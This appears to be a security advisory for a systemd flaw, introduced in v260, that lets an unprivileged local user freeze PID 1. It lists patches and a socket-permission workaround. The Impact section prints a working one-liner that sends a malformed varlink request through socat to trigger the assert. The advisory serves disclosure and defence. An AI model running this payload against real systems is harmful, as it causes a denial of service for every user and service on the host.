        Local unprivileged user can trigger an assert in systemd

Description

  

    
Impact

systemd (as PID 1) hits an assert and freezes execution when an unprivileged IPC API call is made with spurious data:

echo -ne '{"method": "io.systemd.UserDatabase.GetUserRecord", "parameters": {"fuzzyNames": [null,[]]}}\0' | socat - UNIX-CONNECT:/run/systemd/io.systemd.Manager

This is caused by a change in v260 (7993922), so earlier versions are not affected.

Patches

v261 924f5a3

v260.1 6f30740

Workarounds

Change the access control of the varlink socket /run/systemd/io.systemd.Manager so that it is only accessible to root
